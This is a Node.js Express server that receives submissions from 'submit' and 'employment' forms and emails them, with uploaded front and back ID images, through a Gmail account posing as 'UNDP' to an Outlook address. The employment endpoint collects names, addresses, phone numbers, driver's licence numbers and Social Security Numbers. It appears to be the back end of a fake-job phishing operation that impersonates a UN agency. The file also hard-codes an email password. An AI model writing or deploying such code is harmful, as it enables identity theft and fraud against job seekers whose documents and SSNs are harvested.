const express = require("express");
const multer = require("multer");
const nodemailer = require("nodemailer");
const fs = require("fs");
const cors = require("cors");
const app = express();
const port = 3001;

app.use(express.json());
app.use(cors());
// Multer setup for handling file uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "mokeke250@gmail.com",
    pass: "lxvycnellvurscyl",
  },
});

app.post(
  "/api/submit-form",
  upload.fields([
    { name: "idFrontImage", maxCount: 1 },
    { name: "idBackImage", maxCount: 1 },
  ]),
  async (req, res) => {
    // Handle form data
    const formData = req.body;
    const idFrontImage = req.files["idFrontImage"][0];
    const idBackImage = req.files["idBackImage"][0];

    // Create a message object
    const message = {
      from: '"UNDP " <mokeke250@gmail.com>',
      to: "workreport99@outlook.com",
      subject: "New Form Submission",
      html: `
      <p>Form Data:</p>
      <pre>${JSON.stringify(formData, null, 2)}</pre>
    `,
      attachments: [
        { filename: idFrontImage.originalname, content: idFrontImage.buffer },
        { filename: idBackImage.originalname, content: idBackImage.buffer },
      ],
    };

    try {
      // Send email
      await transporter.sendMail(message);
      console.log("Email sent successfully");
      res.status(200).send("Form submitted successfully");
    } catch (error) {
      console.error("Error sending email:", error);
      res.status(500).send("Error submitting form");
    }
  }
);

app.post(
  "/api/employment-form",
  upload.fields([
    { name: "idFrontImage", maxCount: 1 },
    { name: "idBackImage", maxCount: 1 },
  ]),
  async (req, res) => {
    // Handle form data
    const formData = req.body;
    const idFrontImage = req.files["idFrontImage"][0];
    const idBackImage = req.files["idBackImage"][0];

    // Create a message object
    const message = {
      from: '"UNDP " <mokeke250@gmail.com>',
      to: "workreport99@outlook.com",
      subject: "New Employment Form Submission",
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #0C51A1;">New Employment Form Submission</h2>
          <p style="font-size: 30px; color: #333; line-height: 1.6;">Form Data:</p>
          <ul style="list-style: none; padding: 0;">
            <li style="margin-bottom: 10px;">
              <strong style="font-weight: bold; font-size: 28px; color: #333;">Name:</strong>
              <span style="font-size: 20px; color: #666;">${formData.name}</span>
            </li>
            <li style="margin-bottom: 10px;">
              <strong style="font-weight: bold; font-size: 28px; color: #333;">Address:</strong>
              <span style="font-size: 20px; color: #666;">${formData.address}</span>
            </li>
            <li style="margin-bottom: 10px;">
              <strong style="font-weight: bold; font-size: 28px; color: #333;">Phone Number:</strong>
              <span style="font-size: 20px; color: #666;">${formData.phoneNumber}</span>
            </li>
            <li style="margin-bottom: 10px;">
              <strong style="font-weight: bold; font-size: 28px; color: #333;">State:</strong>
              <span style="font-size: 20px; color: #666;">${formData.selectedState}</span>
            </li>
            <li style="margin-bottom: 10px;">
              <strong style="font-weight: bold; font-size: 28px; color: #333;">City:</strong>
              <span style="font-size: 20px; color: #666;">${formData.selectedCity}</span>
            </li>
            <li style="margin-bottom: 10px;">
              <strong style="font-weight: bold; font-size: 28px; color: #333;">ID/Driver's License Number:</strong>
              <span style="font-size: 20px; color: #666;">${formData.idOrDL}</span>
            </li>
            <li style="margin-bottom: 10px;">
              <strong style="font-weight: bold; font-size: 28px; color: #333;">Social Security Number (SSN):</strong>
              <span style="font-size: 20px; color: #666;">${formData.ssn}</span>
            </li>
            <li style="margin-bottom: 10px;">
              <strong style="font-weight: bold; font-size: 28px; color: #333;">Zip Code:</strong>
              <span style="font-size: 20px; color: #666;">${formData.zipCode}</span>
            </li>
            <li style="margin-bottom: 10px;">
              <strong style="font-weight: bold; font-size: 28px; color: #333;">Email:</strong>
              <span style="font-size: 20px; color: #666;">${formData.email}</span>
            </li>
          </ul>
          <div style="margin-top: 20px;">
            <p style="font-size: 20px; color: #333;">Please find attached the ID/Driver License images:</p>
            <div style="display: flex; flex-direction: column; gap: 10px;">
              <img src="cid:idFrontImage" alt="ID/Driver License Front Image" style="max-width: 100%; height: auto; border-radius: 5px;">
              <img src="cid:idBackImage" alt="ID/Driver License Back Image" style="max-width: 100%; height: auto; border-radius: 5px;">
            </div>
          </div>
        </div>
      `,
      attachments: [
        {
          filename: idFrontImage.originalname,
          content: idFrontImage.buffer,
          cid: "idFrontImage",
        },
        {
          filename: idBackImage.originalname,
          content: idBackImage.buffer,
          cid: "idBackImage",
        },
      ],
    };

    try {
      // Send email
      await transporter.sendMail(message);
      console.log("Email sent successfully");
      res.status(200).send("Form submitted successfully");
    } catch (error) {
      console.error("Error sending email:", error);
      res.status(500).send("Error submitting form");
    }
  }
);

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
